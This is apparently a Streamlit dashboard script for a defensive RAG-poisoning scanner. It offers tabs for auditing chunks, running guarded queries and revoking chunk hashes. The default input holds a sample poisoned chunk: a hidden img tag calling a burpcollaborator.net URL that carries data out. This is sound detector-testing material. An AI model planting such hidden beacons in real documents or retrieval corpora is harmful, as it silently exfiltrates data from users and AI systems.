import streamlit as st
import pandas as pd
from ragsentinel.pipeline.sentinel_rag import SentinelRAGPipeline
from ragsentinel.models.schemas import Chunk, ChunkMetadata

st.set_page_config(page_title="RAGSentinel SOC Dashboard", layout="wide")


@st.cache_resource
def get_pipeline():
    return SentinelRAGPipeline()


pipeline = get_pipeline()

st.title("🛡️ RAGSentinel: Security Operations Console")
st.markdown("Real-time scanning, quarantine management, and poisoned retrieval defense.")

tabs = st.tabs(["Ingest Inspector", "Query Security & Counterfactual", "Quarantine Review"])

with tabs[0]:
    st.subheader("Manual Document Ingestion Audit")
    doc_text = st.text_area("Chunk Content", height=150, value="Click here to verify: <img src='https://burpcollaborator.net/telemetry?data=123' style='display:none;' />")
    author = st.text_input("Author ID", value="analyst@enterprise.internal")
    
    if st.button("Audit and Ingest Chunk"):
        cid = f"test-{hash(doc_text)}"
        sha = pipeline.provenance.compute_sha256(doc_text)
        chunk = Chunk(
            text=doc_text,
            metadata=ChunkMetadata(
                chunk_id=cid,
                document_id="manual-doc",
                author_id=author,
                sha256_hash=sha
            )
        )
        results = pipeline.secure_ingest([chunk])
        res = results[0]
        
        if res.verdict == "QUARANTINE":
            st.error(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")
        elif res.verdict == "FLAG":
            st.warning(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")
        else:
            st.success(f"VERDICT: {res.verdict} (Risk: {res.composite_risk:.2f})")

        st.json(res.model_dump())

with tabs[1]:
    st.subheader("Query Pipeline & Influence Engine")
    query_input = st.text_input("Inquiry", value="What are the default system admin credentials?")
    
    if st.button("Execute Safe Retrieval"):
        answer, audit_log = pipeline.secure_query(query_input)
        
        st.markdown("### Generated Response")
        st.info(answer)
        
        st.markdown("### Security Audit Trail")
        if audit_log:
            for log in audit_log:
                st.write(f"- `{log}`")
        else:
            st.write("No anomalous behavior detected during retrieval.")

with tabs[2]:
    st.subheader("Provenance & Revocation Registry")
    st.markdown("Direct access to the cryptographically signed ledger.")
    chunk_to_revoke = st.text_input("Chunk ID to revoke")
    if st.button("Revoke Chunk Hash"):
        pipeline.provenance.revoke_chunk(chunk_to_revoke)
        st.success(f"Chunk {chunk_to_revoke} has been permanently revoked.")


def main():
    pass
